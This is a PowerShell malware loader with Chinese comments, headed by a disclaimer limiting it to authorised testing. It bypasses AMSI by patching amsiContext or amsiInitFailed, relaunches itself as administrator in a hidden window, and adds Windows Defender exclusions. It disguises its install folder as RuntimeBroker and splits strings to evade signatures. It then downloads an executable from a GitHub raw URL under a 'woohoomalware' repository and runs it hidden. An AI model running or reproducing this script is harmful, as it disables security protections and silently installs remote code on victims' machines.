# ============================================================
# 仅供授权安全测试使用！未经许可用于他人系统属违法行为。
# ============================================================

# -------------------- 1. 高级 AMSI 绕过 --------------------
try {
    # 方法：通过反射修改 amsiContext 结构（比 amsiInitFailed 更隐蔽）
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $a.GetField('amsiContext', 'NonPublic,Static')
    $c = $f.GetValue($null)
    # 将扫描状态置为 0（安全）
    [System.Runtime.InteropServices.Marshal]::WriteInt32($c, 0)
} catch {
    # 备用：修改 amsiInitFailed
    try {
        $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $g = $t.GetField('amsiInitFailed', 'NonPublic,Static')
        $g.SetValue($null, $true)
    } catch {}
}

# -------------------- 2. 自我提权 --------------------
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)) {
    $tmp = Join-Path $env:TEMP 'sysupdate.ps1'
    Copy-Item $PSCommandPath $tmp -Force
    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmp`"" -Verb RunAs
    exit
}

# -------------------- 3. 配置变量（使用拼接避免静态特征） --------------------
$dir = Join-Path $env:LOCALAPPDATA ('Microsoft' + '\WindowsApps\RuntimeBroker')
$exe = 'RuntimeBroker.exe'
$full = Join-Path $dir $exe
$url = ('https://raw.githubu' + 'sercontent.com/woohoomalware/WeAreDanger/refs/heads/main/letsgo.exe')

# -------------------- 4. 添加 Defender 排除 --------------------
try {
    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $exe -ErrorAction SilentlyContinue
} catch {}

# -------------------- 5. 创建工作目录 --------------------
New-Item $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

# -------------------- 6. 下载 Payload（优先 IWR，备用 BITS） --------------------
try {
    Invoke-WebRequest -Uri $url -OutFile $full -TimeoutSec 30 -ErrorAction Stop
} catch {
    Start-BitsTransfer -Source $url -Destination $full -Priority High -ErrorAction SilentlyContinue
}

# -------------------- 7. 执行 Payload --------------------
if (Test-Path $full) {
    Start-Sleep -Seconds 2
    Start-Process -FilePath $full -WindowStyle Hidden -WorkingDirectory $dir
} else {
    # 如果下载失败，尝试从备用 URL（可选）
    # ...
}

# -------------------- 8. 可选清理（注释掉以保留脚本用于后续） --------------------
# Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
